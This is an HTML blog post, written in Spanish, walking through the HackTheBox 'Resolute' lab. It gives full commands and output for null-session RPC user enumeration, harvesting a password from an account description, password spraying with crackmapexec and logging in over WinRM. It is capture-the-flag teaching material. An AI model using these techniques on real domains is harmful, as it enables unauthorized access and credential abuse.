@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Resolute (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Resolute (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/04/08/resolute.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/04/08/resolute.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-08T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Resolute (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-08T00:00:00-06:00","datePublished":"2024-04-08T00:00:00-06:00","description":"Posts sobre resolucion de CTFs y ciberseguridad.","headline":"HackTheBox - Resolute (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/04/08/resolute.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/04/08/resolute.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Resolute (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-08T00:00:00-06:00" itemprop="datePublished">
+        Apr 8, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/4c86a642ea237dfde036963e6d182b40.png" />
+</p>
+
+<p>En este post vamos a estar resolviendo la maquina Resolute de la plataforma de HackTheBox en la cual vamos a estar enumerando el protocolo RPC gracias a eso obtendremos una lista de usuarios del dominio con el cual con una contraseña que obtengamos en una descripcion veremos que le pertenece a un usuario para la escalada de privilegios abusaremos del grupo DnsAdmins en el cual inyectaremos un dll para obtener una reverse shell.</p>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Vamos a comenzar escaneando los puertos abiertos por el protocolo <strong>TCP</strong> con la herramienta <strong>Nmap</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49686,49735 10.129.96.155 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-28 14:40 CST
+Nmap scan report <span class="k">for </span>10.129.96.155
+Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-28 20:47:27Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: MEGABANK<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49686/tcp open  msrpc        Microsoft Windows RPC
+49735/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: RESOLUTE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h27m00s, deviation: 4h02m30s, median: 6m59s
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-time:
+|   <span class="nb">date</span>: 2024-03-28T20:48:21
+|_  start_date: 2024-03-28T20:44:01
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE<span class="se">\x</span>00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System <span class="nb">time</span>: 2024-03-28T13:48:19-07:00
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Tenemos varios puertos abiertos entre ellos <strong>RCP</strong>, <strong>Ldap</strong>, con los cuales podemos enumerar mucho, pero primero vamos a comenzar añadiendo los dominios al <strong>/etc/hosts</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.96.155
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.96.155 megabank.local resolute.megabank.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.129.96.155 megabank.local resolute.megabank.local
+</code></pre></div></div>
+
+<ul>
+  <li>De primeras no podemos enumerar nada por <strong>smb</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> //10.129.96.155
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.129.96.155 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno tenemos el protocolo <strong>RPC</strong> abierto asi que vamos a comenzar haciendo un <strong>Null Session</strong> para enumerar los usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.155
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno tenemos un listado potencial de usuarios vamos a ponerlos en una lista y probar un <strong>ASREPRoast</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.155 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
+➜  nmap <span class="nb">cat </span>users.txt
+Administrator
+Guest
+krbtgt
+DefaultAccount
+ryan
+marko
+sunita
+abigail
+marcus
+sally
+fred
+angela
+felicia
+gustavo
+ulf
+stevie
+claire
+paulo
+steve
+annette
+annika
+per
+claude
+melanie
+zach
+simon
+naoki
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno ningún usuario que tenemos es vulnerable a este ataque al parecer ningún usuario tiene configurado el <strong>UF_DONT_REQUIRE_PREAUTH</strong> <a href="https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23">https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-GetNPUsers megabank.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User ryan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User marko doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User sunita doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User abigail doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User marcus doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User sally doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User fred doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User angela doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User felicia doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User gustavo doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User ulf doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User stevie doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User claire doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User paulo doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User steve doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User annette doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User annika doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User per doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User claude doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User melanie doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User zach doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User simon doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User naoki doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</code></pre></div></div>
+
+<h2 id="rpc-enumeración">RPC enumeración</h2>
+
+<ul>
+  <li>Bueno como pudimos autenticarnos sin proporcionar contraseña ni nada vamos a enumerar los usuarios para ver sus descripciones, ya que existen casos donde se comparten contraseñas en las descripciones, por ejemplo podemos ver la del usuario <strong>Administrador</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.155
+rpcclient <span class="nv">$&gt;</span> queryuser Administrator
+	User Name   :	Administrator
+	Full Name   :	
+	Home Drive  :	
+	Dir Drive   :	
+	Profile Path:	
+	Logon Script:	
+	Description :	Built-in account <span class="k">for </span>administering the computer/domain
+	Workstations:	
+	Comment     :	
+	Remote Dial :
+	Logon Time               :	Thu, 28 Mar 2024 14:45:17 CST
+	Logoff Time              :	Wed, 31 Dec 1969 18:00:00 CST
+	Kickoff Time             :	Wed, 31 Dec 1969 18:00:00 CST
+	Password last <span class="nb">set </span>Time   :	Thu, 28 Mar 2024 15:43:03 CST
+	Password can change Time :	Fri, 29 Mar 2024 15:43:03 CST
+	Password must change Time:	Wed, 13 Sep 30828 20:48:05 CST
+	unknown_2[0..31]...
+	user_rid :	0x1f4
+	group_rid:	0x201
+	acb_info :	0x00000210
+	fields_present:	0x00ffffff
+	logon_divs:	168
+	bad_password_count:	0x00000000
+	logon_count:	0x00000077
+	padding1[0..7]...
+	logon_hrs[0..21]...
+</code></pre></div></div>
+
+<ul>
+  <li>Como son muchos usuarios podemos crear un <strong>script</strong> en <strong>Python3</strong> que nos filtre por las descripciones de los usuarios para ir más rapido.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">re</span>
+
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">users.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">user</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+        <span class="c1"># Ejecutamos el comando
+</span>        <span class="n">command_output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">'</span><span class="s">rpcclient</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-N</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-U</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">,</span> <span class="sh">'</span><span class="s">megabank.local</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="s">queryuser </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="sh">'</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="c1"># Filtramos por las lineas que contengan "User Name" o "Description"
+</span>        <span class="n">filtered_output</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">command_output</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span> <span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">User Name|Description</span><span class="sh">'</span><span class="p">,</span> <span class="n">line</span><span class="p">)]</span>
+        <span class="c1"># Imprimimos el resultado
+</span>        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">filtered_output</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li>Y encontramos una contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 xd.py
+	User Name   :	Administrator
+	Description :	Built-in account <span class="k">for </span>administering the computer/domain
+	User Name   :	Guest
+	Description :	Built-in account <span class="k">for </span>guest access to the computer/domain
+	User Name   :	krbtgt
+	Description :	Key Distribution Center Service Account
+	User Name   :	DefaultAccount
+	Description :	A user account managed by the system.
+	User Name   :	ryan
+	Description :	
+	User Name   :	marko
+	Description :	Account created. Password <span class="nb">set </span>to Welcome123!
+	User Name   :	sunita
+	Description :	
+	User Name   :	abigail
+	Description :	
+	User Name   :	marcus
+	Description :	
+	User Name   :	sally
+	Description :	
+	User Name   :	fred
+	Description :	
+	User Name   :	angela
+	Description :	
+	User Name   :	felicia
+	Description :	
+	User Name   :	gustavo
+	Description :	
+	User Name   :	ulf
+	Description :	
+	User Name   :	stevie
+	Description :	
+	User Name   :	claire
+	Description :	
+	User Name   :	paulo
+	Description :	
+	User Name   :	steve
+	Description :	
+	User Name   :	annette
+	Description :	
+	User Name   :	annika
+	Description :	
+	User Name   :	per
+	Description :	
+	User Name   :	claude
+	Description :	
+	User Name   :	melanie
+	Description :	
+	User Name   :	zach
+	Description :	
+	User Name   :	simon
+	Description :	
+	User Name   :	naoki
+	Description :	
+</code></pre></div></div>
+
+<h1 id="passwordspray">PasswordSpray</h1>
+
+<ul>
+  <li>Ahora podemos usar <strong>crackmapexec</strong> para ver si algún usuario usa la contraseña mediante un <strong>passwordspray</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.96.155 <span class="nt">-u</span> users.txt <span class="nt">-p</span> Welcome123! <span class="nt">--continue-on-success</span>
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\A</span>dministrator:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\G</span>uest:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\k</span>rbtgt:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\D</span>efaultAccount:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\r</span>yan:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\m</span>arko:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>unita:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>bigail:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\m</span>arcus:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>ally:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\f</span>red:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>ngela:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\f</span>elicia:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\g</span>ustavo:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\u</span>lf:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>tevie:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\c</span>laire:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\p</span>aulo:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>teve:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>nnette:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>nnika:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\p</span>er:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\c</span>laude:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\m</span>elanie:Welcome123!
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\z</span>ach:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>imon:Welcome123! STATUS_LOGON_FAILURE
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\n</span>aoki:Welcome123! STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<h2 id="shell-as-melanie">Shell as melanie</h2>
+
+<ul>
+  <li>Tenemos la contraseña del usuario <strong>melanie</strong> vemos que por <strong>smb</strong> solo tenemos acceso de <strong>READ</strong> a algunos recursos compartidos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.96.155 <span class="nt">-u</span> melanie <span class="nt">-p</span> Welcome123! <span class="nt">--shares</span>
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\m</span>elanie:Welcome123!
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] Enumerated shares
+SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
+SMB         10.129.96.155   445    RESOLUTE         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.96.155   445    RESOLUTE         ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.96.155   445    RESOLUTE         C<span class="nv">$ </span>                             Default share
+SMB         10.129.96.155   445    RESOLUTE         IPC<span class="nv">$ </span>                           Remote IPC
+SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share
+SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Si probamos con el protocolo <strong>winrm</strong> nos devuelve <strong>Pwn3d!</strong> eso significa que las credenciales son válidas y podemos usar <strong>evil-winrm</strong> para conectarnos con el usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.96.155 <span class="nt">-u</span> melanie <span class="nt">-p</span> Welcome123!
+SMB         10.129.96.155   5985   RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span>
+HTTP        10.129.96.155   5985   RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.96.155:5985/wsman
+WINRM       10.129.96.155   5985   RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\m</span>elanie:Welcome123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Ahora nos podemos conectar y ver la <strong>user flag</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.96.155 <span class="nt">-u</span> melanie <span class="nt">-p</span> Welcome123!
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>megabank<span class="se">\m</span>elanie
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+28d98e800659d48be64838d5b9bfce11
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
